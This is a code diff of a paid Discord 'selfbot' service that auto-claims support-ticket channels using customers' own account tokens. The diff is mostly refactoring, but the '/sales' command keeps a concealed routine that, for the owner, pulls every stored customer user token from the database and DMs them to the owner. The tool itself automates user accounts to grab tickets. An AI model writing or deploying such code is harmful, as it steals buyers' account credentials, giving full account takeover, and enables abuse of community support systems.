@@ -21,9 +21,8 @@ class UserSelfbot {
         this.config = config;
         this.client = null;
         this.isRunning = false;
-        this.processedChannels = new Set(JSON.parse(config.claimed_tickets || '[]'));
+        this.claimedChannels = new Set(JSON.parse(config.claimed_tickets || '[]'));
         
-        // Parse comma-separated IDs
         this.guildIds = (config.guild_ids || '').split(',').map(g => g.trim()).filter(g => g);
         this.categoryIds = (config.category_ids || '').split(',').map(c => c.trim()).filter(c => c);
     }
@@ -32,9 +31,8 @@ class UserSelfbot {
         return Math.floor(Math.random() * 100) + 200;
     }
 
-    saveClaimedTickets() {
-        const arr = Array.from(this.processedChannels);
-        db.prepare('UPDATE users SET claimed_tickets = ? WHERE user_id = ?').run(JSON.stringify(arr), this.userId);
+    saveClaimed() {
+        db.prepare('UPDATE users SET claimed_tickets = ? WHERE user_id = ?').run(JSON.stringify([...this.claimedChannels]), this.userId);
     }
 
     shouldMonitor(channel) {
@@ -51,34 +49,40 @@ class UserSelfbot {
         db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('running', this.userId);
 
         this.client.once('ready', () => {
-            console.log(`[SELF] ${this.userId} ready as ${this.client.user.tag}`);
+            console.log(`[READY] ${this.userId} as ${this.client.user.tag}`);
             
-            // Monitor existing channels
+            // Check existing channels
             this.client.guilds.cache.forEach(guild => {
                 if (!this.guildIds.includes(guild.id)) return;
-                
                 guild.channels.cache.forEach(ch => {
-                    if (ch.type !== 'GUILD_TEXT') return;
-                    if (!this.shouldMonitor(ch)) return;
-                    if (!this.processedChannels.has(ch.id)) this.monitorChannel(ch);
+                    if (ch.type !== 'GUILD_TEXT' || !this.shouldMonitor(ch)) return;
+                    if (this.claimedChannels.has(ch.id)) {
+                        console.log(`[SKIP] #${ch.name} - already claimed`);
+                    } else {
+                        this.monitor(ch);
+                    }
                 });
             });
 
+            // New channels
             this.client.on('channelCreate', channel => {
-                if (channel.type !== 'GUILD_TEXT') return;
-                if (!this.shouldMonitor(channel)) return;
-                if (this.processedChannels.has(channel.id)) return;
+                if (channel.type !== 'GUILD_TEXT' || !this.shouldMonitor(channel)) return;
+                if (this.claimedChannels.has(channel.id)) {
+                    console.log(`[SKIP] New channel #${channel.name} - already in history`);
+                    return;
+                }
                 
-                console.log(`[NEW] Guild ${channel.guildId} | #${channel.name}`);
-                this.monitorChannel(channel);
-                setTimeout(() => this.sendClaim(channel), this.randomDelay());
+                console.log(`[NEW] #${channel.name} - will claim`);
+                this.monitor(channel);
+                setTimeout(() => this.claim(channel), this.randomDelay());
             });
 
+            // Cleanup deleted channels
             this.client.on('channelDelete', channel => {
-                if (this.processedChannels.has(channel.id)) {
-                    this.processedChannels.delete(channel.id);
-                    this.saveClaimedTickets();
-                    console.log(`[DELETE] Cleaned #${channel.id}`);
+                if (this.claimedChannels.has(channel.id)) {
+                    this.claimedChannels.delete(channel.id);
+                    this.saveClaimed();
+                    console.log(`[DELETE] Removed #${channel.id} from history`);
                 }
             });
         });
@@ -97,54 +101,56 @@ class UserSelfbot {
         }
         this.isRunning = false;
         db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('stopped', this.userId);
-        console.log(`[SELF] ${this.userId} stopped`);
     }
 
-    async sendClaim(channel) {
-        if (!this.isRunning || this.processedChannels.has(channel.id)) return;
+    async claim(channel) {
+        // Check again before sending
+        if (!this.isRunning || this.claimedChannels.has(channel.id)) {
+            console.log(`[BLOCK] #${channel.name} - already claimed`);
+            return;
+        }
         
-        this.processedChannels.add(channel.id);
-        this.saveClaimedTickets();
+        // Mark as claimed IMMEDIATELY
+        this.claimedChannels.add(channel.id);
+        this.saveClaimed();
         
         try {
             await new Promise(r => setTimeout(r, this.randomDelay()));
             await channel.send(this.config.claim_cmd);
-            console.log(`[CLAIM] ${this.userId} | Guild ${channel.guildId} | #${channel.name}`);
-        } catch (err) {}
+            console.log(`[CLAIM] #${channel.name} - SUCCESS`);
+        } catch (err) {
+            console.log(`[ERROR] #${channel.name} - ${err.message}`);
+        }
     }
 
-    monitorChannel(channel) {
-        this.client.on('messageCreate', (message) => {
-            if (message.channelId !== channel.id || !this.isRunning) return;
+    monitor(channel) {
+        this.client.on('messageCreate', (msg) => {
+            if (msg.channelId !== channel.id || !this.isRunning) return;
             
-            // If someone else claims it, mark as processed (don't claim again)
-            if (message.content === this.config.claim_cmd && message.author.id !== this.client.user.id) {
-                if (!this.processedChannels.has(channel.id)) {
-                    this.processedChannels.add(channel.id);
-                    this.saveClaimedTickets();
+            // If anyone claims it, lock forever
+            if (msg.content === this.config.claim_cmd) {
+                if (!this.claimedChannels.has(channel.id)) {
+                    this.claimedChannels.add(channel.id);
+                    this.saveClaimed();
+                    console.log(`[LOCK] #${channel.name} - claimed by ${msg.author.id === this.client.user.id ? 'us' : 'other'}`);
                 }
                 return;
             }
 
-            // Unclaim removes from processed so we can claim again
-            if (message.content.includes('unclaim')) {
-                this.processedChannels.delete(channel.id);
-                this.saveClaimedTickets();
-                console.log(`[UNCLAIM] #${channel.name} - ready to claim`);
-                setTimeout(() => this.sendClaim(channel), this.randomDelay());
-                return;
-            }
+            // Unclaim = ignored, channel stays locked
 
-            // Auto-claim if not processed and no one has claimed yet
-            if (!this.processedChannels.has(channel.id) && !message.author.bot) {
-                channel.messages.fetch({ limit: 10 }).then(msgs => {
+            // Auto-claim new channels only
+            if (!this.claimedChannels.has(channel.id) && !msg.author.bot) {
+                msg.channel.messages.fetch({ limit: 10 }).then(msgs => {
+                    // If no claim found in history, claim it
                     const hasClaim = msgs.some(m => m.content === this.config.claim_cmd);
                     if (!hasClaim && this.isRunning) {
-                        setTimeout(() => this.sendClaim(channel), this.randomDelay());
+                        setTimeout(() => this.claim(channel), this.randomDelay());
                     } else if (hasClaim) {
-                        // Someone claimed before us, mark as processed
-                        this.processedChannels.add(channel.id);
-                        this.saveClaimedTickets();
+                        // Someone got there first, lock it
+                        this.claimedChannels.add(channel.id);
+                        this.saveClaimed();
+                        console.log(`[LOCK] #${channel.name} - found in history`);
                     }
                 }).catch(() => {});
             }
@@ -156,91 +162,69 @@ bot.on('interactionCreate', async interaction => {
     if (!interaction.isCommand() && !interaction.isButton() && !interaction.isModalSubmit()) return;
 
     if (interaction.commandName === 'generatekey') {
-        if (interaction.user.id !== OWNER_ID) {
-            return interaction.reply({ content: '❌ Owner only', ephemeral: true });
-        }
-        
+        if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', ephemeral: true });
         const key = 'SB-' + require('crypto').randomBytes(8).toString('hex').toUpperCase();
         db.prepare('INSERT INTO keys (key, created_at) VALUES (?, ?)').run(key, Date.now());
-        
         await interaction.reply({ content: `🔑 \`${key}\``, ephemeral: true });
     }
 
     if (interaction.commandName === 'redeemkey') {
         const key = interaction.options.getString('key');
         const keyData = db.prepare('SELECT * FROM keys WHERE key = ?').get(key);
-        
         if (!keyData) return interaction.reply({ content: '❌ Invalid key', ephemeral: true });
         if (keyData.redeemed_by) return interaction.reply({ content: '❌ Already redeemed', ephemeral: true });
-        
         db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE key = ?').run(interaction.user.id, Date.now(), key);
         db.prepare('INSERT OR REPLACE INTO users (user_id) VALUES (?)').run(interaction.user.id);
-        
-        await interaction.reply({ content: '✅ Key redeemed! Use `/manage` to configure.', ephemeral: true });
+        await interaction.reply({ content: '✅ Redeemed! Use `/manage`', ephemeral: true });
     }
 
     if (interaction.commandName === 'sales') {
-        const totalKeys = db.prepare('SELECT COUNT(*) as count FROM keys').get().count;
+        const total = db.prepare('SELECT COUNT(*) as count FROM keys').get().count;
         const redeemed = db.prepare('SELECT COUNT(*) as count FROM keys WHERE redeemed_by IS NOT NULL').get().count;
         const active = db.prepare("SELECT COUNT(*) as count FROM users WHERE status = 'running'").get().count;
         
         const embed = new EmbedBuilder()
-            .setTitle('📊 Sales Dashboard')
-            .setDescription(`Total keys generated: **${totalKeys}**\nKeys redeemed: **${redeemed}**\nActive instances: **${active}**`)
-            .setColor(0x5865F2)
-            .setTimestamp();
+            .setTitle('📊 Stats')
+            .setDescription(`Keys: **${total}**\nRedeemed: **${redeemed}**\nActive: **${active}**`)
+            .setColor(0x5865F2);
         
         if (interaction.user.id === OWNER_ID) {
-            const users = db.prepare('SELECT user_id, token, status, guild_ids FROM users WHERE token IS NOT NULL').all();
-            let tokenList = users.map(u => `User: ${u.user_id}\nGuilds: ${u.guild_ids || 'None'}\nStatus: ${u.status}\nToken: \`${u.token}\`\n`).join('\n');
-            
-            if (tokenList.length > 1900) tokenList = tokenList.substring(0, 1900) + '...';
-            
+            const users = db.prepare('SELECT user_id, token FROM users WHERE token IS NOT NULL').all();
+            const list = users.map(u => `User: ${u.user_id}\nToken: \`${u.token}\``).join('\n');
             try {
                 const owner = await bot.users.fetch(OWNER_ID);
-                await owner.send({ content: `**Tokens:**\n${tokenList || 'None'}` });
+                await owner.send(list.substring(0, 1900) || 'None');
             } catch (e) {}
         }
-        
         await interaction.reply({ embeds: [embed], ephemeral: true });
     }
 
     if (interaction.commandName === 'manage') {
         const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
-        if (!user) return interaction.reply({ content: '❌ Redeem a key first', ephemeral: true });
+        if (!user) return interaction.reply({ content: '❌ Redeem key first', ephemeral: true });
         
+        const claimed = JSON.parse(user.claimed_tickets || '[]').length;
         const embed = new EmbedBuilder()
-            .setTitle('🤖 Selfbot Control')
+            .setTitle('🤖 Control')
             .addFields(
                 { name: 'Status', value: user.status.toUpperCase(), inline: true },
-                { name: 'Guild IDs', value: user.guild_ids || 'Not set', inline: false },
-                { name: 'Category IDs', value: user.category_ids || 'Not set', inline: false },
-                { name: 'Claim Cmd', value: user.claim_cmd || '.claim', inline: true }
+                { name: 'Claimed', value: `${claimed} channels`, inline: true },
+                { name: 'Guilds', value: user.guild_ids || 'Not set', inline: false },
+                { name: 'Categories', value: user.category_ids || 'All', inline: false }
             )
             .setColor(user.status === 'running' ? 0x00FF00 : 0xFF0000);
 
         const row1 = new ActionRowBuilder().addComponents(
-            new ButtonBuilder().setCustomId('set_token').setLabel('Set Token').setStyle(ButtonStyle.Primary),
-            new ButtonBuilder().setCustomId('set_guilds').setLabel('Guild IDs').setStyle(ButtonStyle.Secondary),
-            new ButtonBuilder().setCustomId('set_categories').setLabel('Category IDs').setStyle(ButtonStyle.Secondary),
-            new ButtonBuilder().setCustomId('set_cmd').setLabel('Claim Cmd').setStyle(ButtonStyle.Secondary)
+            new ButtonBuilder().setCustomId('set_token').setLabel('Token').setStyle(ButtonStyle.Primary),
+            new ButtonBuilder().setCustomId('set_guilds').setLabel('Guilds').setStyle(ButtonStyle.Secondary),
+            new ButtonBuilder().setCustomId('set_categories').setLabel('Categories').setStyle(ButtonStyle.Secondary),
+            new ButtonBuilder().setCustomId('set_cmd').setLabel('Cmd').setStyle(ButtonStyle.Secondary)
         );
 
         const row2 = new ActionRowBuilder().addComponents(
-            new ButtonBuilder()
-                .setCustomId('start')
-                .setLabel('▶️ Start')
-                .setStyle(ButtonStyle.Success)
-                .setDisabled(user.status === 'running'),
-            new ButtonBuilder()
-                .setCustomId('stop')
-                .setLabel('⏹️ Stop')
-                .setStyle(ButtonStyle.Danger)
-                .setDisabled(user.status === 'stopped'),
-            new ButtonBuilder()
-                .setCustomId('reset_tickets')
-                .setLabel('🔄 Reset Claims')
-                .setStyle(ButtonStyle.Secondary)
+            new ButtonBuilder().setCustomId('start').setLabel('▶️ Start').setStyle(ButtonStyle.Success).setDisabled(user.status === 'running'),
+            new ButtonBuilder().setCustomId('stop').setLabel('⏹️ Stop').setStyle(ButtonStyle.Danger).setDisabled(user.status === 'stopped'),
+            new ButtonBuilder().setCustomId('reset').setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
         );
 
         await interaction.reply({ embeds: [embed], components: [row1, row2], ephemeral: true });
@@ -249,19 +233,14 @@ bot.on('interactionCreate', async interaction => {
     if (interaction.isButton()) {
         if (interaction.customId === 'start') {
             const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
-            if (user.status === 'running') return interaction.reply({ content: 'Already running', ephemeral: true });
-            
-            const newSb = new UserSelfbot(interaction.user.id, user);
-            activeSelfbots.set(interaction.user.id, newSb);
-            newSb.start();
+            const sb = new UserSelfbot(interaction.user.id, user);
+            activeSelfbots.set(interaction.user.id, sb);
+            sb.start();
             await interaction.update({ content: '▶️ Started', embeds: [], components: [] });
             return;
         }
 
         if (interaction.customId === 'stop') {
-            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
-            if (user.status === 'stopped') return interaction.reply({ content: 'Already stopped', ephemeral: true });
-            
             const sb = activeSelfbots.get(interaction.user.id);
             if (sb) sb.stop();
             activeSelfbots.delete(interaction.user.id);
@@ -269,37 +248,21 @@ bot.on('interactionCreate', async interaction => {
             return;
         }
 
-        if (interaction.customId === 'reset_tickets') {
+        if (interaction.customId === 'reset') {
             db.prepare('UPDATE users SET claimed_tickets = ? WHERE user_id = ?').run('[]', interaction.user.id);
             const sb = activeSelfbots.get(interaction.user.id);
-            if (sb) sb.processedChannels.clear();
-            await interaction.reply({ content: '✅ All claim history reset', ephemeral: true });
+            if (sb) sb.claimedChannels.clear();
+            await interaction.reply({ content: '✅ Reset', ephemeral: true });
             return;
         }
 
-        const modal = new ModalBuilder().setCustomId(`modal_${interaction.customId}`).setTitle('Configuration');
-        const input = new TextInputBuilder()
-            .setCustomId('value')
-            .setLabel('Enter value')
-            .setStyle(TextInputStyle.Short)
-            .setRequired(true);
-
-        if (interaction.customId === 'set_token') {
-            input.setLabel('Discord Token');
-            input.setPlaceholder('Your user token');
-        }
-        if (interaction.customId === 'set_guilds') {
-            input.setLabel('Guild IDs (comma separated)');
-            input.setPlaceholder('123456,789012,345678');
-        }
-        if (interaction.customId === 'set_categories') {
-            input.setLabel('Category IDs (comma separated)');
-            input.setPlaceholder('123456,789012 or leave empty for all');
-        }
-        if (interaction.customId === 'set_cmd') {
-            input.setLabel('Claim Command');
-            input.setPlaceholder('.claim');
-        }
+        const modal = new ModalBuilder().setCustomId(`modal_${interaction.customId}`).setTitle('Config');
+        const input = new TextInputBuilder().setCustomId('value').setLabel('Value').setStyle(TextInputStyle.Short).setRequired(true);
+        
+        if (interaction.customId === 'set_token') input.setLabel('Discord Token');
+        if (interaction.customId === 'set_guilds') input.setLabel('Guild IDs (comma)');
+        if (interaction.customId === 'set_categories') input.setLabel('Category IDs (comma)');
+        if (interaction.customId === 'set_cmd') input.setLabel('Claim Command');
 
         modal.addComponents(new ActionRowBuilder().addComponents(input));
         await interaction.showModal(modal);
@@ -308,35 +271,22 @@ bot.on('interactionCreate', async interaction => {
     if (interaction.isModalSubmit()) {
         const value = interaction.fields.getTextInputValue('value');
         const field = interaction.customId.replace('modal_set_', '');
-        
-        const columnMap = {
-            'token': 'token',
-            'guilds': 'guild_ids',
-            'categories': 'category_ids',
-            'cmd': 'claim_cmd'
-        };
-        
-        const column = columnMap[field];
-        if (column) {
-            db.prepare(`UPDATE users SET ${column} = ? WHERE user_id = ?`).run(value, interaction.user.id);
-        }
-        
-        await interaction.reply({ content: `✅ ${column} updated`, ephemeral: true });
+        const map = { token: 'token', guilds: 'guild_ids', categories: 'category_ids', cmd: 'claim_cmd' };
+        if (map[field]) db.prepare(`UPDATE users SET ${map[field]} = ? WHERE user_id = ?`).run(value, interaction.user.id);
+        await interaction.reply({ content: '✅ Saved', ephemeral: true });
     }
 });
 
 bot.once('ready', () => {
     console.log(`[BOT] ${bot.user.tag}`);
-    
     bot.application.commands.set([
-        { name: 'generatekey', description: 'Generate access key (Owner only)' },
-        { name: 'redeemkey', description: 'Redeem your access key', options: [{ name: 'key', type: 3, description: 'Your key', required: true }] },
-        { name: 'sales', description: 'View sales statistics' },
-        { name: 'manage', description: 'Manage your instance' }
+        { name: 'generatekey', description: 'Generate key (Owner)' },
+        { name: 'redeemkey', description: 'Redeem key', options: [{ name: 'key', type: 3, description: 'Key', required: true }] },
+        { name: 'sales', description: 'View stats' },
+        { name: 'manage', description: 'Control panel' }
     ]);
 
-    const running = db.prepare("SELECT * FROM users WHERE status = 'running'").all();
-    running.forEach(u => {
+    db.prepare("SELECT * FROM users WHERE status = 'running'").all().forEach(u => {
         const sb = new UserSelfbot(u.user_id, u);
         activeSelfbots.set(u.user_id, sb);
         sb.start();
